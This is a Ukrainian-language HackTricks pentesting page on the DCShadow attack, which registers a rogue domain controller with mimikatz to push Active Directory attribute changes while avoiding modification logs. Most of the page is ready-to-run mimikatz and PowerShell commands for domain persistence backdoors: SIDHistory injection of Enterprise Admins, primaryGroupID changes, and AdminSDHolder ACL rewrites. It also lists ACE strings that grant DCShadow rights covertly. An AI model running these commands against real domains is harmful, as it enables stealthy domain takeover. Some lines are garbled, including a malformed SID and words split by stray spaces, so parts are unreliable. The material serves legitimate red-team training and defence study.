{{#include ../../banners/hacktricks-training.md}}

# DCShadow

Він реєструє **новий контролер домену** в AD і використовує його для **поширення атрибутів** (SIDHistory, SPNs...) на вказаних об'єктах **без** залишення будь-яких **логів** щодо **модифікацій**. Вам **потрібні DA** привілеї і ви повинні бути в **кореневому домені**.\
Зверніть увагу, що якщо ви використовуєте неправильні дані, з'являться досить неприємні логи.

Для виконання атаки вам потрібно 2 екземпляри mimikatz. Один з них запустить RPC-сервери з привілеями SYSTEM (тут ви повинні вказати зміни, які хочете виконати), а інший екземпляр буде використовуватися для поширення значень:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Зверніть увагу, що **`elevate::token`** не працюватиме в сесії `mimikatz1`, оскільки це підвищило привілеї потоку, але нам потрібно підвищити **привілей процесу**.\
Ви також можете вибрати об'єкт "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Ви можете внести зміни від DA або від користувача з цими мінімальними правами:

- У **об'єкті домену**:
- _DS-Install-Replica_ (Додати/Видалити репліку в домені)
- _DS-Replication-Manage-Topology_ (Управління топологією реплікації)
- _DS-Replication-Synchronize_ (Синхронізація реплікації)
- **Об'єкт сайтів** (та його нащадки) у **контейнері конфігурації**:
- _CreateChild and DeleteChild_
- Об'єкт **комп'ютера, який зареєстрований як DC**:
- _WriteProperty_ (Не записувати)
- **Цільовий об'єкт**:
- _WriteProperty_ (Не записувати)

Ви можете використовувати [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1), щоб надати ці привілеї непривабливому користувачу (зверніть увагу, що це залишить деякі журнали). Це набагато більш обмежувально, ніж мати привілеї DA.\
Наприклад: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Це означає, що ім'я користувача _**student1**_ при вході в систему на машині _**mcorp-student1**_ має права DCShadow на об'єкт _**root1user**_.

## Використання DCShadow для створення бекдорів
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
## Shadowception - Надати права DCShadow за допомогою DCShadow (без змінених журналів прав)

Нам потрібно додати наступні ACE з SID нашого користувача в кінці:

- На об'єкті домену:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- На об'єкті комп'ютера атакуючого: `(A;;WP;;;UserSID)`
- На об'єкті цільового користувача: `(A;;WP;;;UserSID)`
- На об'єкті Сайтів у контейнері Конфігурації: `(A;CI;CCDC;;;UserSID)`

Щоб отримати поточний ACE об'єкта: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Зверніть увагу, що в цьому випадку вам потрібно зробити **кілька змін,** а не лише одну. Тому, в **сесії mimikatz1** (RPC сервер) використовуйте параметр **`/stack` з кожною зміною,** яку ви хочете внести. Таким чином, вам потрібно буде **`/push`** лише один раз, щоб виконати всі накопичені зміни на роговому сервері.

[**Більше інформації про DCShadow на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
